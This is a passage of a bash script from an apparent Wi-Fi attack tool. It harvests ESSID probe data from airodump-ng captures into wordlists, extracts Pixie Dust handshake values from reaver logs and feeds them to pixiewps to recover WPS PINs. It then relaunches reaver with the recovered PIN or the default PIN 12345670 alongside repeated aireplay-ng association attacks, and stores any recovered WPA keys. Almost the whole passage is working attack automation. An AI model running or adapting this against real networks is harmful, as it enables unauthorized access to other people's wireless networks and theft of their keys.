cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 " " $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 " " $11 " " $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10e.txt

cat /tmp/ESSIDPROBE_DIR/holdfield*.txt >> /tmp/ESSIDPROBE_DIR/holdall16.txt

rm -f /tmp/ESSIDPROBE_DIR/holdfield*.txt

sleep 2

# Removes white spaces from left, limits length, sorts and removes duplicates

cat /tmp/ESSIDPROBE_DIR/holdall16.txt | sed 's/,/ /g' | sed 's/^[ \t]*//;s/[ \t]*$//' | awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt

echo "[+] Sorting essidprobesdic.txt"
sleep .2

cat /root/PROBEESSID_DATA/essidprobesdic.txt  > /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt

sleep .2

rm -f /root/PROBEESSID_DATA/essidprobesdic.txt

cat  /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt > /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt

sleep .2

# shorter strings

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt | sed 's/^[ \t]*//;s/[ \t]*$//' | awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt

sleep .2

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt

sleep .2

cp -f /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt /root/PROBEESSID_DATA/essidprobesdic.txt

echo "[+] Transfering essidprobesdic.txt to /root/PROBEESSID_DATA/"

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $1 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05a.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $2 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05b.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $3 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05c.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $4 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05d.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $5 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05e.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $6 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05f.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $7 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05g.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $8 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05h.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $9 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05i.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $10 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05j.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold-05*.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold05.txt

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt | sed s'/,/ /'g | sed 's/     / /g' | sed 's/    / /g' | sed 's/   / /g' | sed 's/  / /g' | sed 's/ / /g' > /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $1 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX18dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $2 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX28dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $3 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX38dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $4 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX48dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $5 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX58dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $6 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX68dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $7 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX78dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $8 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX88dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $9 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX98dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $10 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX108dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobesi*.txt >> /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt

echo "[+] Sorting essidprobes8dic.txt"

rm -f /tmp/ESSIDPROBE_DIR/essidprobesi*.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt | awk 'length($0) > 7' > /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt |  sort -u  > /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt

echo "[+] Transfering essidprobes8dic.txt to /root/PROBEESSID_DATA/"

cp -f /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt /root/PROBEESSID_DATA/essidprobes8dic.txt 

sleep .2

}

#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#

ESSIDREF_fn()

{
### essidreference ###

echo "[+] Writing ESSID Reference"
cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {print $1 " " $6 " " $7 " " $8 " " $9 " " $10 " " $11 }}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/essidrefhold01.txt

sleep 2

cp -f /root/PROBEESSID_DATA/essidrefhold.txt /tmp/ESSIDPROBE_DIR/essidrefhold03.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold01.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold03.txt

sleep .2
 
cat /tmp/ESSIDPROBE_DIR/essidrefhold03.txt | sed 's/  / /g' | awk '{if(($3 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt | awk '{if(($4 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt | awk '{if(($3 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt
echo "[+] Writing ESSID Reference Sort"
cat /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt | sort -u | uniq -u > /tmp/ESSIDPROBE_DIR/essidrefhold04.txt

sleep .2

rm -f /root/PROBEESSID_DATA/essidrefhold.txt

sleep .2

cp -f /tmp/ESSIDPROBE_DIR/essidrefhold04.txt /root/PROBEESSID_DATA/essidrefhold.txt

sleep .2

echo "[+] Copying any ESSID Probes obtained thru"
echo "[+] airodump-ng to the /root/PROBEESSID_DATA folder"

rm -f /tmp/ESSIDPROBE_DIR/*.csv

sleep 3

}

#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~Start Pin Found Start~~~~~~~~~~~~~~~#

PINFOUND_fn() #looks for WPA key found

{

PINFND=ZZZ
#Aug 17 2017
WPAYUU=

	if [ -f  /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD ]; then

PINFND=$(cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "PIN:")) {print $3}}')

		fi

	if [[ -z $PINFND ]]; then

		PINFND=ZZZ

			fi
	
	if [[ $PINFND == PIN: ]]; then

WPSPIN=$(cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "PIN:")) {print $0}}')
sleep 1

# Check for WPA key present

WPAYUU=$(cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPA") && (length($4) != 0  )) { print $4 }}')

WPAKEY=$(cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPA")) { print $0 }}')
sleep 1

APSSID=$(cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "AP")) {print $0 }}')

sleep 1

echo ""
echo -e "$txtrst    Pin cracked"
echo ""
echo -e "$txtrst    $WPSPIN"
echo -e "$txtrst    $WPAKEY"
echo -e "$txtrst    $APSSID"
echo""
echo -e "$txtrst    See file /root/VARMAC_LOGS/$NAME1-$DATEFILE-$PAD"
echo -e " "


if  [[ ! -z $WPAYUU ]]; then

#add
echo "$WPSPIN" > /root/VARMAC_WPSWPA/$bssid-$ssid-WPA_Key_FOUND
sleep 1
echo "$WPAKEY" >> /root/VARMAC_WPSWPA/$bssid-$ssid-WPA_Key_FOUND
sleep 1
echo "$APSSID" >> /root/VARMAC_WPSWPA/$bssid-$ssid-WPA_Key_FOUND
sleep 1
echo " " >> /root/VARMAC_WPSWPA/$bssid-$ssid-WPA_Key_FOUND
sleep 1
echo "   Note WPA Key is found between the two(2) tick symbols" >> /root/VARMAC_WPSWPA/$bssid-$ssid-WPA_Key_FOUND
sleep 1
echo "$bssid-WPA_Key_FOUND-$ssid" > /root/VARMAC_WHITELST/$bssid-WPA_Key_FOUND-$ssid
	
	sleep 3

		fi

		fi

#if [[  $PINFND=ZZZ ]]; then
#	echo -e  "$txtrst"
#	echo -e  "[+] WPA Key not found"
#	sleep 3

#		fi

}

#~~~~~~~~~~~~~~~End Pin Found End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~Start Pixie Dust Data Sequence Analyer Start~~~~~~~~~~~#

PDDSA_fn()  # truncated version of PDDSA-06  checks on first pixie dust data sequence

{

echo "[+] Looking for pixiedust data sequences in file"

echo "[+] /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD"

rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt

PINFND=ZZZ
######make directory for reaver output #############

PKRCOR="00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:02"

PKRERR="02:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"

PINNUM=0

## Get BSSID_PD

BSSID_PD=$(cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($2 == "Waiting") && ($4 = "beacon")) {print $6}}')

#Correct Length
BSSID_PD=$(echo $BSSID_PD | awk '{print substr($0,0,18)}')


	if [[ $REVPIX_TYPE == 1 ]]; then

cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[P]") && ($2 != "WPS")) {print $2" "$3" "$4}}' > /tmp/Aquarius01

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "WPS:") && ($2 != "WPS")) {$1=""; print $0 }}' | sed -e 's/^[ \t]*//' > /tmp/Aquarius01

		fi

	if [[ $REVPIX_TYPE == 1 ]]; then

cat < /tmp/Aquarius01 | awk -F' ' '{ if($1 != "Access") {print $1" "$2" "$3" "$4}}' > /tmp/Aquarius02

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/Aquarius01 | awk -F' ' '{ if(($1 == "DH") || ($1 == "Enrollee") || ($1 == "E-Hash1")|| ($1 == "E-Hash2")|| ($1 == "AuthKey") || ($1 == "Registrar")) {print $0 }}' > /tmp/Aquarius02

		fi

#Add Line Number for sequence pixie data stream

	if [[ $REVPIX_TYPE == 1 ]]; then

cat -n  /tmp/Aquarius02 > /tmp/Aquarius04

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/Aquarius02 | awk -F' ' '{ if(($2 != "MAC") && ($2 != "Authentication") && ($2 != "Encryption") && ($2 != "Connection") && ($2 != "Config") && ($2 != "Wi-Fi") && ($2 != "RF") && ($2 != "Association") && ($2 != "Private") && ($2 != "public") && ($2 != "shared") && ($2 != "proved")&& ($2 != "Configuration")) {print $0 }}' |  awk '!seen[$0]++' > /tmp/Aquarius03

sleep 2

cat -n  /tmp/Aquarius03 > /tmp/Aquarius04

		fi

#remove white space from left of first word

# Find first set with possible completion

	if [[ $REVPIX_TYPE == 1 ]]; then

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2:")) {print $1}}' > /tmp/nonseq.txt

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2")) {print $1}}' > /tmp/nonseq.txt


		fi

# Search line number for further data

# E-Hash2 lines assign variables

#Line counter embed in awk

LNECNT=1

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

# To terminate program if no Ehash2 found

LINENULL=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

if [ ! -z $LINENULL ]; then

# Find total number of sequences in the file

until [ -z  $LINESTART ]; do   

	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)
	LNECNT=$(($LNECNT + 1))

		done

LNECNT=$(($LNECNT -2))

LNEND=$(($LNECNT))

LNEND=$(($LNEND))

#Reset back to line one

LNECNT=1

# EHash2 shows data completion back down to collect the pixie var 

BADAT=ZZZ

until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

SEQ_fn()

{

echo -e "$txtrst"

	if [ $LINESTART > 6  ]; then

SEQ7=$LINESTART

SEQ1=$(($SEQ7 -6 ))
SEQ2=$(($SEQ7 -5 ))
SEQ3=$(($SEQ7 -4 ))
SEQ4=$(($SEQ7 -3 ))
SEQ5=$(($SEQ7 -2 ))
SEQ6=$(($SEQ7 -1 ))
SEQ7=$(($SEQ7))

	if [[ $REVPIX_TYPE == 1 ]]; then

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "E-Nonce:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "Enrollee")) {$1=$2=$3=$4=$5=""; print $0}}')

           fi


	if [[ $REVPIX_TYPE == 1 ]]; then

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "PKE:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "peer")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

		fi


	if [[ $REVPIX_TYPE == 1 ]]; then

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "R-Nonce:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "Registrar")) {$1=$2=$3=$4=$5=""; print $0}}')

		fi


	if [[ $REVPIX_TYPE == 1 ]]; then

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "PKR:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "own")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

		fi

	if [[ $REVPIX_TYPE == 1 ]]; then
 
AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey:")) {print $3}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1:")) {print $3}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2:")) {print $3}}')

	fi

	if [[ $REVPIX_TYPE == 2 ]]; then

AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey")) {$1=$2=$3=$4=""; print $0}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1")) {$1=$2=$3=$4=""; print $0}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2")) {$1=$2=$3=$4=""; print $0}}')

	fi



#Remove blank spaces beginning of variable


#	if [[ $REVPIX_TYPE == 2 ]]; then

ENONCE=$(echo $ENONCE | sed -e 's/^[ \t]*//')
RNONCE=$(echo $RNONCE | sed -e 's/^[ \t]*//')
PKR=$(echo $PKR | sed -e 's/^[ \t]*//')
PKE=$(echo $PKE | sed -e 's/^[ \t]*//')
AUTHKEY=$(echo $AUTHKEY | sed -e 's/^[ \t]*//')
HASH1=$(echo $HASH1 | sed -e 's/^[ \t]*//')
HASH2=$(echo $HASH2 | sed -e 's/^[ \t]*//')

#Replace space w/ colon

ENONCE=${ENONCE// /:}
RNONCE=${RNONCE// /:}
PKE=${PKE// /:}
PKR=${PKR// /:}
AUTHKEY=${AUTHKEY// /:}
HASH1=${HASH1// /:}
HASH2=${HASH2// /:}

bar=${bar// /:}

#	fi

if [ "$PKR" == "$PKRERR" ]; then

		PKR=$PKRCOR

    		    fi
#For debug
echo "E-Nonce: = $ENONCE"
echo "PKE: = $PKE"
echo "R-Nonce: = $RNONCE" 
echo "PKR: = $PKR"
echo "AuthKey: = $AUTHKEY"
echo "E-Hash1: = $HASH1"
echo "E-Hash2: = $HASH2"

	fi

}

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#RNONCE} = 47  ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo -e "$txtrst"
echo -e "$info Checking Pixie Dust data sequence$yel $LNECNT$info.$txtrst"
sleep 1

	if [ ! -z $BSSID_PD ]; then

	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --e-bssid $BSSID_PD --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

	sleep 2

			fi
	if [ -z $BSSID_PD ]; then

	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

	sleep 2

			fi

		BADAT=1
  		 
	else

		if [ $LNECNT -eq $LNEND ]; then

		BADAT=1
		echo -e "$info    Required Pixie data sequences exhausted.$txtrst"
		
			fi

		if [ $LNECNT -lt  $LNEND ]; then
					
		LNECNT=$(($LNECNT + 1))
		echo ""
		echo -e "$info    Required Pixie data incomplete trying the next sequence.$txtrst"
		sleep 1
		BADAT=0

				fi

					fi

		done

pixieseq="/tmp/pixieseq.txt"

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ $PINFND != WPS ]; then

		clear

			fi
      
		fi

if [[ -z  $LINENULL ]] || [[ $LNELFT == 1 && $PINFND != WPS ]] || [[ $LNEND = 1 && $PINFND != WPS ]]; then

#echo -e "$txtrst    WPS Pin Not Found."
echo -e "$txtrst"

		fi

if [[ $PINFND == WPS ]]; then

WPSPIN=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $4}}')

echo ""
echo -e "$txtrst    WPS Pin Found!"
echo ""
echo -e "$txtrst    WPS Pin = $WPSPIN"
echo ""
echo -e "$txtrst    Loading WPS Pin into reaver"

# store WPS pin to text file

echo "PIN_FOUND=$WPSPIN-$ssid-$bssid" > /root/VARMAC_WPSWPA/PIN_FOUND-$WPSPIN-$ssid-$bssid

xterm -g 80x10-1+250 -T "Airodump-ng Scan 2" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

sleep 3

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]]; then

xterm -g 80x15-1+1 -T "reaver pin= $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=tmp/$bssid  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]]; then

xterm -g 80x15-1+1 -T "reaver pin= $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=tmp/$bssid  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

sleep 1

xterm -g 80x10-1+400 -T "Regenerative Aireplay-ng AP Activation" -e "while true; do aireplay-ng -1 10 -a $bssid -q 4 $monitor; killall -q aireplay-ng; sleep 2; done" &

echo -e "$txtrst"

echo -e "[+] Loading WPS pin $WPSPIN found into reaver"
echo -e "[+] Reattacking $ssid $bssid on channel $channel"
echo -e "[+]"
echo -e "[+] Time before program restart"
seconds=$reavertime; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

echo -e "$txtrst"

PIDREV1=$(pgrep reaver)
kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null
sleep 1
killall -q pixiewps &>dev\null

sleep 2

echo -e "$txtrst"

PINFOUND_fn #looks for WPA key found

	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then
			
			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi

		fi

sleep 3

	if  [[ -z $WPAYUU ]]; then #Check if WPA Key Found so skip @ first check

#		CHKPINFILE_fn  #checks if pin found in previous attacks
# Test move to attack_fn beginning

##########PIN NOT FOUND Check two pins 00000000 and 123455670

        if [[ $PINFND != WPS && $NUL70 != 1 && -z $WPAYUU ]] && [[ $DEF70PIN == y || $DEF70PIN == Y ]]; then

WPSPIN=12345670


xterm -g 80x10-1+250 -T "Airodump-ng Scan 3" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

sleep 3

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

sleep 1

AIRACT_fn
#sets airplay-ng/mdk3 activity

echo -e "$txtrst"

echo -e "[+] Loading default WPS pin $WPSPIN into reaver"
echo -e "[+] Reattacking $ssid $bssid on channel $channel"
echo -e ""
echo -e "[+] Time before program restart"
seconds=$DEF70TIME; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

echo -e "$txtrst"

PIDREV1=$(pgrep reaver)
kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null
sleep 1
killall -q pixiewps &>dev\null

sleep 2

PINFOUND_fn #looks for WPA key found

